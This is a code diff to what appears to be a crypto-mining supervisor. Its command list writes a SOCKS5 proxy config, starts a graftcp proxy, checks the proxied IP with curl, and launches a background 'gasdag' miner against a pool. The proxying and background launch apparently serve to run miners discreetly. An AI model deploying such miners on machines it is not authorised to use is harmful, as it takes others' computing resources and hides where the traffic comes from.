@@ -401,9 +401,10 @@ class MiningSupervisor:
                 f"socks5_username = {username}",
                 f"socks5_password = {password}",
                 "EOF",
+                "chmod +x gasdag graftcp/graftcp graftcp/local/graftcp-local 2>/dev/null || true",
                 "./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &",
                 "sleep 0.3",
-                "./graftcp/graftcp chmod +x gasdag 2>/dev/null || chmod +x gasdag 2>/dev/null || true",
+                "./graftcp/graftcp curl -s ifconfig.me >/dev/null 2>&1 || true",
                 f"nohup ./graftcp/graftcp ./gasdag -a {algo} -o {pool} -u {worker_id} -p x {cpu_arg} > ~/workspace/gasdag.log 2>&1 &",
                 "echo 'START_MINING_SH_SUCCESS'"
             ]
